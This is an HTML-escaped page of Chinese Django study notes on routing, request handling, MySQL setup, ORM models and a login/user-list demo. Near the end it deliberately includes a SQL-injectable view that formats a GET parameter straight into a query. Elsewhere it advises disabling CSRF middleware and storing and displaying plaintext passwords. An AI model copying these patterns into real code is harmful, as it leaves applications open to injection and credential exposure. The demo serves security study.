STATICFILES_DIRS = [  # &#x4EE4;&#x724C;&#x6301;&#x6709;&#x8005;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;
  os.path.join(BASE_DIR,&apos;static&apos;),
  os.path.join(BASE_DIR,&apos;static1&apos;),
  os.path.join(BASE_DIR,&apos;static2&apos;),
]
&quot;&quot;&quot;
&#x67E5;&#x627E;&#x987A;&#x5E8F;&#x5C31;&#x662F;&#x4ECE;&#x4E0A;&#x5F80;&#x4E0B;&#x4F9D;&#x6B21;&#x67E5;&#x627E;&#xFF0C;&#x67E5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x5C31;&#x4E0D;&#x4F1A;&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x627E;&#x4E86;&#x6240;&#x4EE5;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x66FF;&#x6362;&#x7684;&#x60C5;&#x51B5;
&quot;&quot;&quot;

# &#x4EE4;&#x724C;&#x52A8;&#x6001;&#x89E3;&#x6790;
&lt;link href=&quot;/static/a.txt&quot;&gt;&lt;/link&gt;    

{# load static #}
&lt;link href=&quot;{# static &apos;a.txt&apos; #}&quot;&gt;&lt;/link&gt;
</code></pre>
</li>
<li><p>request&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x767B;&#x9646;&#x529F;&#x80FD;</span>

<span class="hljs-comment"># form&#x8868;&#x5355;action&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x5199;&#x6CD5;</span>

request.method  <span class="hljs-comment">#    &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x65B9;&#x5F0F;  &#x5168;&#x5927;&#x5199;&#x7684;&#x5B57;&#x7B26;&#x4E32;</span>

request.GET        <span class="hljs-comment"># &#x83B7;&#x53D6;url&#x95EE;&#x597D;&#x540E;&#x9762;&#x643A;&#x5E26;&#x7684;&#x53C2;&#x6570;</span>
    .get()  &#x5217;&#x8868;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;
  .getlist()  &#x62FF;&#x6574;&#x4E2A;&#x5217;&#x8868;
request.POST  <span class="hljs-comment"># &#x83B7;&#x53D6;post&#x8BF7;&#x6C42;&#x63D0;&#x4EA4;&#x8FC7;&#x6765;&#x7684;&#x666E;&#x901A;&#x952E;&#x503C;&#x5BF9;(&#x4E0D;&#x5305;&#x542B;&#x6587;&#x4EF6;)</span>
    .get()  &#x5217;&#x8868;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;
  .getlist()  &#x62FF;&#x6574;&#x4E2A;&#x5217;&#x8868;
<span class="hljs-string">&quot;&quot;&quot;
&#x524D;&#x671F;&#x6211;&#x4EEC;&#x5728;&#x671D;django&#x540E;&#x7AEF;&#x63D0;&#x4EA4;post&#x8BF7;&#x6C42;&#x7684;&#x662F;&#x65F6;&#x5019;&#x8981;&#x5148;&#x53BB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x91CA;&#x4E00;&#x884C;&#x4EE3;&#x7801;
MIDDLEWARE = [
    # csrf...
]
&quot;&quot;&quot;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(request)</span>:</span>
  <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:
     <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;post&apos;</span>)
  <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;get&apos;</span>)
</code></pre>
</li>
<li><p>pycharm&#x94FE;&#x63A5;&#x6570;&#x636E;&#x5E93;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x627E;&#x5230;pycharm database&#x9009;&#x9879;(&#x4E09;&#x4E2A;&#x5730;&#x65B9;&#x67E5;&#x627E;)</span>

<span class="hljs-comment"># &#x9009;&#x53D6;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93; &#x4E0B;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x9A71;&#x52A8;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x660E;&#x660E;&#x94FE;&#x63A5;&#x4E0A;&#x4E86;&#x6570;&#x636E;&#x5E93; &#x4F46;&#x662F;&#x770B;&#x4E0D;&#x5230;&#x8868;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;
&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x5C06;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x94FE;&#x63A5;&#x5220;&#x9664; &#x91CD;&#x65B0;&#x94FE;&#x63A5;&#x4E00;&#x6B21;&#x5373;&#x53EF;
&quot;&quot;&quot;</span>
</code></pre>
</li>
<li><p>django&#x94FE;&#x63A5;MySQL</p>
<pre><code class="lang-python"><span class="hljs-comment"># 1.&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;</span>
DATABASES = {
    <span class="hljs-string">&apos;default&apos;</span>: {
        <span class="hljs-string">&apos;ENGINE&apos;</span>: <span class="hljs-string">&apos;django.db.backends.mysql&apos;</span>,
        <span class="hljs-string">&apos;NAME&apos;</span>: <span class="hljs-string">&apos;day60&apos;</span>,
        <span class="hljs-string">&apos;USER&apos;</span>:<span class="hljs-string">&apos;root&apos;</span>,
        <span class="hljs-string">&apos;PASSWORD&apos;</span>:<span class="hljs-string">&apos;admin123&apos;</span>,
        <span class="hljs-string">&apos;HOST&apos;</span>:<span class="hljs-string">&apos;127.0.0.1&apos;</span>,
        <span class="hljs-string">&apos;PORT&apos;</span>:<span class="hljs-number">3306</span>,
        <span class="hljs-string">&apos;CHARSET&apos;</span>:<span class="hljs-string">&apos;utf8&apos;</span>
    }
}

<span class="hljs-comment"># 2.init&#x6587;&#x4EF6;&#x6307;&#x5B9A;pymysql</span>
<span class="hljs-keyword">import</span> pymysql
pymysql.install_as_MySQLdb()
</code></pre>
</li>
<li><p>django orm(&#x91CD;&#x8981;)</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
orm&#x4E0D;&#x4F1A;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x5E93; &#x53EA;&#x80FD;&#x521B;&#x5EFA;&#x5230;&#x8868;&#x7684;&#x5C42;&#x9762;
&#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x63D0;&#x524D;&#x521B;&#x5EFA;&#x597D;&#x5E93;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x5BF9;&#x8C61;&#x5173;&#x7CFB;&#x6620;&#x5C04;</span>
&#x8868;                    &#x7C7B;
&#x8BB0;&#x5F55;            &#x5BF9;&#x8C61;
&#x6570;&#x636E;            &#x5BF9;&#x8C61;&#x5C5E;&#x6027;/&#x65B9;&#x6CD5;
<span class="hljs-string">&quot;&quot;&quot;
&#x80FD;&#x591F;&#x8BA9;&#x4E00;&#x4E2A;&#x4E0D;&#x4F1A;sql&#x8BED;&#x53E5;&#x7684;python&#x7A0B;&#x5E8F;&#x5458;&#x4E5F;&#x80FD;&#x591F;&#x7B80;&#x5355;&#x5FEB;&#x6377;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6781;&#x5927;&#x7684;&#x63D0;&#x5347;&#x5F00;&#x53D1;&#x6548;&#x7387;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x53BB;&#x5E94;&#x7528;&#x4E0B;&#x7684;models.py&#x4E2D;&#x4E66;&#x5199;&#x6A21;&#x578B;&#x7C7B;</span>
    <span class="hljs-comment"># &#x7C7B;            &#x6A21;&#x578B;&#x7C7B;</span>
  <span class="hljs-comment"># &#x8868;            &#x6A21;&#x578B;&#x8868;</span>
  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-comment"># &#x5F53;&#x4F60;&#x6CA1;&#x6709;&#x521B;&#x5EFA;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x7684;&#x65F6;&#x5019;orm&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;id&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;</span>
    uid = models.AutoField(primary_key=<span class="hljs-keyword">True</span>)
    <span class="hljs-comment"># uid int primary key auto_increment</span>
    username = models.CharField(max_length=<span class="hljs-number">32</span>)
    <span class="hljs-comment"># username varchar(32)    CharField&#x5B57;&#x6BB5;&#x4E00;&#x5B9A;&#x8981;&#x4E66;&#x5199;max_length&#x53C2;&#x6570;</span>
    password = models.IntegerField()
    <span class="hljs-comment"># password int</span>
**************************&#x6570;&#x636E;&#x5E93;&#x8FC1;&#x79FB;&#x547D;&#x4EE4;*****************************
<span class="hljs-number">1.</span>python manage.py makemigrations
    <span class="hljs-comment"># &#x5C06;&#x64CD;&#x4F5C;&#x8BB0;&#x5F55;&#x5230;&#x5C0F;&#x672C;&#x672C;&#x4E0A;(migrations&#x6587;&#x4EF6;&#x5939;&#x5185;)  &#x4E0D;&#x80FD;&#x771F;&#x6B63;&#x7684;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;</span>
<span class="hljs-number">2.</span>python manage.py migrate
    <span class="hljs-comment"># &#x5C06;&#x64CD;&#x4F5C;&#x771F;&#x6B63;&#x7684;&#x540C;&#x6B65;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;</span>
<span class="hljs-string">&quot;&quot;&quot;&#x53EA;&#x8981;&#x5728;models&#x4E2D;&#x4E66;&#x5199;&#x4E86;&#x8DDF;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801; &#x5C31;&#x5FC5;&#x987B;&#x8981;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x4E0A;&#x8FF0;&#x4E24;&#x6761;&#x547D;&#x4EE4;&quot;&quot;&quot;</span>

<span class="hljs-comment"># pycharm&#x7B80;&#x5355;&#x5FEB;&#x6377;&#x8F93;&#x5165;</span>
    tools
      run manage.py task
        &#x81EA;&#x52A8;&#x63D0;&#x793A;
*******************************************************************
</code></pre>
</li>
<li><p>&#x7B80;&#x5355;&#x7684;orm&#x8BED;&#x53E5;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5B57;&#x6BB5;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;</span>
    <span class="hljs-comment"># &#x589E;</span>
      <span class="hljs-number">1.</span>&#x7EC8;&#x7AEF;&#x91CC;&#x9762;&#x81EA;&#x5DF1;&#x52A0;&#x9ED8;&#x8BA4;&#x503C;
    <span class="hljs-number">2.</span>null=<span class="hljs-keyword">True</span>
    <span class="hljs-number">3.</span>default=<span class="hljs-string">&apos;666&apos;</span>

  <span class="hljs-comment"># &#x5220;</span>
      &#x6CE8;&#x91CA;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E24;&#x6761;&#x547D;&#x4EE4; &#xFF08;&#x7136;&#x540E;&#x6536;&#x62FE;&#x884C;&#x674E;&#x8DD1;&#x8DEF;&#x8D70;&#x4EBA;&#xFF09;
    <span class="hljs-comment"># &#x5728;&#x64CD;&#x4F5C;models.py&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x5B9A;&#x8981;&#x7EC6;&#x5FC3;</span>

  <span class="hljs-comment"># &#x6539;</span>
      &#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E24;&#x6761;&#x547D;&#x4EE4;

<span class="hljs-comment"># &#x6570;&#x636E;&#x7684;&#x589E;&#x67E5;</span>
    <span class="hljs-comment"># &#x589E;</span>
      <span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models
      <span class="hljs-number">1.</span>create()
        user_obj = models.UserInfo.objects.create(**kwargs)
      <span class="hljs-comment"># &#x6539;&#x65B9;&#x6CD5;&#x6709;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x503C; &#x5C31;&#x662F;&#x5F53;&#x524D;&#x521B;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x672C;&#x8EAB;</span>
    <span class="hljs-number">2.</span>&#x5BF9;&#x8C61;.save()
        <span class="hljs-comment"># &#x5148;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;</span>
      user_obj = models.User(**kwargs)
      <span class="hljs-comment"># &#x5BF9;&#x8C61;&#x8C03;&#x7528;save&#x65B9;&#x6CD5;</span>
      user_obj.save()

  <span class="hljs-comment"># &#x67E5;</span>
      <span class="hljs-number">1.</span>filter()                            <span class="hljs-comment"># where</span>
        res = models.UserInfo.objects.filter(**kwargs)
      <span class="hljs-string">&quot;&quot;&quot;
      &#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x4E00;&#x4E2A;querySet&#x5BF9;&#x8C61; &#x4F60;&#x53EF;&#x4EE5;&#x628A;&#x5B83;&#x770B;&#x6210;&#x662F;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#x5957;&#x6570;&#x636E;&#x5BF9;&#x8C61;        
          [&#x6570;&#x636E;&#x5BF9;&#x8C61;1&#xFF0C;&#x6570;&#x636E;&#x5BF9;&#x8C61;2...]

      &#x652F;&#x6301;&#x7D22;&#x5F15;&#x548C;&#x5207;&#x7247;&#x64CD;&#x4F5C; &#x4F46;&#x662F;&#x4E0D;&#x652F;&#x6301;&#x8D1F;&#x6570; &#x5E76;&#x4E14;&#x4E0D;&#x63A8;&#x8350;&#x4F60;&#x4F7F;&#x7528;&#x7D22;&#x5F15;

      .first()&#x65B9;&#x6CD5;

        filter&#x62EC;&#x53F7;&#x5185;&#x53EF;&#x4EE5;&#x5199;&#x591A;&#x4E2A;&#x53C2;&#x6570; &#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x9ED8;&#x8BA4;&#x662F;and&#x5173;&#x7CFB;
      &quot;&quot;&quot;</span>
</code></pre>
</li>
</ul>
<p>day61</p>
<pre><code>1.&#x5148;&#x5728;urls.py&#x91CC;&#x9762;&#x8BBE;&#x7F6E;&#x597D;&#x8DEF;&#x7531;
</code></pre><p><a href="https://imgse.com/i/p91NIRx" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91NIRx.png" alt="p91NIRx.png"></a></p>
<pre><code>2.&#x5728;views.py&#x91CC;&#x8BBE;&#x7F6E;&#x597D;&#x5BF9;&#x5E94;&#x7684;&#x65B9;&#x6CD5;
</code></pre><p><a href="https://imgse.com/i/p91U3TJ" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91U3TJ.png" alt="p91U3TJ.png"></a></p>
<pre><code>3.
login&#x65B9;&#x6CD5;
&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x65F6;&#x8FD4;&#x56DE;login.html&#x89C6;&#x56FE;
</code></pre><p><a href="https://imgse.com/i/p91Ua6K" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91Ua6K.png" alt="p91Ua6K.png"></a></p>
<p><a href="https://imgse.com/i/p91UB0e" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91UB0e.png" alt="p91UB0e.png"></a></p>
<p>action=&quot;&quot;&#x5C31;&#x662F;&#x63D0;&#x4EA4;&#x5230;&#x5F53;&#x524D;&#xFF0C;&#x5982;&#x679C;&#x5F53;&#x524D;&#x63A5;&#x6536;&#x662F;POST&#x65B9;&#x5F0F;&#x8FC7;&#x6765;&#x7684;&#xFF0C;&#x5C31;&#x5C06;&#x83B7;&#x53D6;&#x7684;&#x8D26;&#x6237;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x6BD4;&#x5BF9;&#x5224;&#x65AD;&#xFF0C;&#x53E6;&#x5916;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x7684;&#x8BED;&#x53E5;&#x662F;&#x9632;SQL&#x6CE8;&#x5165;&#x7684;</p>
<p><a href="https://imgse.com/i/p91UDTH" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91UDTH.png" alt="p91UDTH.png"></a></p>
<pre><code>&#x7136;&#x540E;&#x662F;reg&#x65B9;&#x6CD5;&#xFF0C;&#x65B9;&#x6CD5;&#x540C;&#x7406;
&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x8D26;&#x6237;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;
        user_obj = models.User(username=username,password=password)
        user_obj.save()
</code></pre><pre><code>&#x8BBF;&#x95EE;userlist&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;&#x7528;user_queryset = models.User.objects.all()&#x63A5;&#x6536;&#x5230;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#xFF0C;render&#x5230;userlist.html&#x89C6;&#x56FE;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x89C6;&#x56FE;&#x4E2D;&#x901A;&#x8FC7;for&#x8FED;&#x4EE3;&#x51FA;&#x6BCF;&#x4E00;&#x884C;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5C55;&#x793A;
</code></pre><pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/twitter-bootstrap/3.4.1/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.bootcss.com/twitter-bootstrap/3.4.1/js/bootstrap.min.js&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-center&quot;</span>&gt;</span>&#x6570;&#x636E;&#x5C55;&#x793A;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-8 col-md-offset-2&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-striped table-hover&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>username<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>password<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>action<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
                    {# for user_obj in user_queryset #}
                        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{[ user_obj.id ]}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{[ user_obj.username ]}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{[ user_obj.password ]}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/edit_user/?user_id={[ user_obj.id ]}&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-xs&quot;</span>&gt;</span>&#x7F16;&#x8F91;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/delete_user/?user_id={[ user_obj.id ]}&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger btn-xs&quot;</span>&gt;</span>&#x5220;&#x9664;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
                    {# endfor #}
                <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><a href="https://imgse.com/i/p91UjnU" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91UjnU.png" alt="p91UjnU.png"></a></p>
<p>&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x7684;demo</p>
<p>&#x5728;urls.py&#x91CC;</p>
<pre><code class="lang-python">path(<span class="hljs-string">&apos;sql/&apos;</span>, views.sql),
</code></pre>
<p>&#x5728;views.py&#x91CC;</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sql</span><span class="hljs-params">(request)</span>:</span>
    conn = pymysql.connect(
        host=<span class="hljs-string">&apos;127.0.0.1&apos;</span>,
        port=<span class="hljs-number">3306</span>,
        user=<span class="hljs-string">&apos;root&apos;</span>,
        password=<span class="hljs-string">&apos;root&apos;</span>,
        database=<span class="hljs-string">&apos;day60&apos;</span>,
        charset=<span class="hljs-string">&apos;utf8&apos;</span>  <span class="hljs-comment"># &#x7F16;&#x7801;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x52A0;-</span>
    )

    id = request.GET.get(<span class="hljs-string">&apos;id&apos;</span>)
    sql = f<span class="hljs-string">&quot;select * from app01_user where id = {id}&quot;</span>

    cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)
    res = cursor.execute(sql)
    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;&#x6536;&#x5230;&#x4E86; &#x5B9D;&#x8D1D;&quot;</span>)
</code></pre>
<p><a href="https://imgse.com/i/p91dCVg" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91dCVg.png" alt="p91dCVg.png"></a></p>
<h4 id="orm&#x521B;&#x5EFA;&#x8868;&#x5173;&#x7CFB;">orm&#x521B;&#x5EFA;&#x8868;&#x5173;&#x7CFB;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> models

<span class="hljs-comment"># &#x521B;&#x5EFA;&#x8868;&#x5173;&#x7CFB;  &#x5148;&#x5C06;&#x57FA;&#x8868;&#x521B;&#x5EFA;&#x51FA;&#x6765; &#x7136;&#x540E;&#x518D;&#x6DFB;&#x52A0;&#x5916;&#x952E;&#x5B57;&#x6BB5;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span><span class="hljs-params">(models.Model)</span>:</span>
    title = models.CharField(max_length=<span class="hljs-number">32</span>)
    price = models.DecimalField(max_digits=<span class="hljs-number">8</span>,decimal_places=<span class="hljs-number">2</span>)
    <span class="hljs-comment"># &#x603B;&#x5171;&#x516B;&#x4F4D; &#x5C0F;&#x6570;&#x70B9;&#x540E;&#x9762;&#x5360;&#x4E24;&#x4F4D;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x56FE;&#x4E66;&#x548C;&#x51FA;&#x7248;&#x793E;&#x662F;&#x4E00;&#x5BF9;&#x591A; &#x5E76;&#x4E14;&#x4E66;&#x662F;&#x591A;&#x7684;&#x4E00;&#x65B9; &#x6240;&#x4EE5;&#x5916;&#x952E;&#x5B57;&#x6BB5;&#x653E;&#x5728;&#x4E66;&#x8868;&#x91CC;&#x9762;
    &quot;&quot;&quot;</span>
    publish = models.ForeignKey(to=<span class="hljs-string">&apos;Publish&apos;</span>)  <span class="hljs-comment"># &#x9ED8;&#x8BA4;&#x5C31;&#x662F;&#x4E0E;&#x51FA;&#x7248;&#x793E;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x505A;&#x5916;&#x952E;&#x5173;&#x8054;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5982;&#x679C;&#x5B57;&#x6BB5;&#x5BF9;&#x5E94;&#x7684;&#x662F;ForeignKey &#x90A3;&#x4E48;&#x4F1A;orm&#x4F1A;&#x81EA;&#x52A8;&#x5728;&#x5B57;&#x6BB5;&#x7684;&#x540E;&#x9762;&#x52A0;_id
    &#x5982;&#x679C;&#x4F60;&#x81EA;&#x4F5C;&#x806A;&#x660E;&#x7684;&#x52A0;&#x4E86;_id&#x90A3;&#x4E48;orm&#x8FD8;&#x662F;&#x4F1A;&#x5728;&#x540E;&#x9762;&#x7EE7;&#x7EED;&#x52A0;_id

    &#x540E;&#x9762;&#x5728;&#x5B9A;&#x4E49;ForeignKey&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4E0D;&#x8981;&#x81EA;&#x5DF1;&#x52A0;_id
    &quot;&quot;&quot;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x56FE;&#x4E66;&#x548C;&#x4F5C;&#x8005;&#x662F;&#x591A;&#x5BF9;&#x591A;&#x7684;&#x5173;&#x7CFB; &#x5916;&#x952E;&#x5B57;&#x6BB5;&#x5EFA;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x65B9;&#x5747;&#x53EF; &#x4F46;&#x662F;&#x63A8;&#x8350;&#x4F60;&#x5EFA;&#x5728;&#x67E5;&#x8BE2;&#x9891;&#x7387;&#x8F83;&#x9AD8;&#x7684;&#x4E00;&#x65B9;
    &quot;&quot;&quot;</span>
    authors = models.ManyToManyField(to=<span class="hljs-string">&apos;Author&apos;</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    authors&#x662F;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x5B57;&#x6BB5; &#x4E3B;&#x8981;&#x662F;&#x7528;&#x6765;&#x544A;&#x8BC9;orm &#x4E66;&#x7C4D;&#x8868;&#x548C;&#x4F5C;&#x8005;&#x8868;&#x662F;&#x591A;&#x5BF9;&#x591A;&#x5173;&#x7CFB;
    &#x8BA9;orm&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x7B2C;&#x4E09;&#x5F20;&#x5173;&#x7CFB;&#x8868;
    &quot;&quot;&quot;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Publish</span><span class="hljs-params">(models.Model)</span>:</span>
    name = models.CharField(max_length=<span class="hljs-number">32</span>)
    addr = models.CharField(max_length=<span class="hljs-number">32</span>)

